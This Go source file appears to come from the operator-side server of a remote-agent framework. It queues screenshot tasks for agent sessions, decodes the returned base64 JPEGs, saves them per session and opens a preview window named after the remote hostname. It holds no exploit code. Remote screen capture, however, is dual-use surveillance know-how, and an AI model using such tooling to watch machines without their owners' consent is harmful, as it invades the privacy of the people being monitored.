package services

// Screenshot support: the operator runs `screenshot` in the console, the task
// is created, the agent returns a base64 JPEG envelope and the server saves it
// under data/screenshots/<session>/ so it can be inspected later.

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"github.com/user/wisp/shared/protocol"
	"github.com/wailsapp/wails/v3/pkg/application"
)

// ScreenshotResult is returned to the frontend.
type ScreenshotResult struct {
	Status  string `json:"status"` // pending | completed | failed
	Path    string `json:"path"`
	W       int    `json:"w"`
	H       int    `json:"h"`
	DataURL string `json:"data_url"` // data:image/jpeg;base64,... for preview
}

// TakeScreenshot creates a screenshot task and returns its task id. The
// frontend polls the task (via GetTask) and then calls GetScreenshot.
func (ss *SessionService) TakeScreenshot(sessionID string) (string, error) {
	if sessionID == "" {
		return "", fmt.Errorf("session id is required")
	}
	task, err := ss.serverSvc.GetDB().CreateTask(sessionID, int(protocol.CmdScreenshot), "")
	if err != nil {
		return "", err
	}
	return task.ID, nil
}

// GetScreenshot finalizes a completed screenshot task: decodes the base64
// JPEG, stores it under data/screenshots/<session>/ and returns the path.
func (ss *SessionService) GetScreenshot(taskID string) (ScreenshotResult, error) {
	task, err := ss.serverSvc.GetDB().GetTask(taskID)
	if err != nil {
		return ScreenshotResult{Status: "failed"}, err
	}
	if task.Status != "completed" {
		if task.Status == "failed" {
			return ScreenshotResult{Status: "failed", Path: task.Result}, nil
		}
		return ScreenshotResult{Status: "pending"}, nil
	}

	var payload struct {
		W    int    `json:"w"`
		H    int    `json:"h"`
		Data string `json:"data"`
	}
	if err := json.Unmarshal([]byte(task.Result), &payload); err != nil {
		return ScreenshotResult{Status: "failed"}, fmt.Errorf("parse screenshot result: %w", err)
	}
	img, err := base64.StdEncoding.DecodeString(payload.Data)
	if err != nil {
		return ScreenshotResult{Status: "failed"}, fmt.Errorf("decode screenshot: %w", err)
	}

	dir := filepath.Join(ss.serverSvc.GetDB().DataDir(), "screenshots", task.SessionID)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return ScreenshotResult{Status: "failed"}, err
	}
	path := filepath.Join(dir, fmt.Sprintf("shot_%s.jpg", time.Now().Format("20060102_150405")))
	if err := os.WriteFile(path, img, 0644); err != nil {
		return ScreenshotResult{Status: "failed"}, err
	}
	return ScreenshotResult{
		Status:  "completed",
		Path:    path,
		W:       payload.W,
		H:       payload.H,
		DataURL: "data:image/jpeg;base64," + base64.StdEncoding.EncodeToString(img),
	}, nil
}

// OpenScreenshotWindow opens a standalone window that captures and previews a
// screenshot of the given session (frontend route "/?view=shot&session=<id>").
func (ss *SessionService) OpenScreenshotWindow(sessionID string) error {
	if sessionID == "" {
		return fmt.Errorf("session id is required")
	}
	app := ss.serverSvc.GetApp()
	if app == nil {
		return fmt.Errorf("wails app is not ready")
	}
	title := "Screenshot"
	if sess, err := ss.serverSvc.GetDB().GetSession(sessionID); err == nil && sess.Hostname != "" {
		title = fmt.Sprintf("Screenshot — %s", sess.Hostname)
	}
	app.Window.NewWithOptions(application.WebviewWindowOptions{
		Title:  title,
		Width:  900,
		Height: 600,
		URL:    "/?view=shot&session=" + sessionID,
	}).Show()
	return nil
}
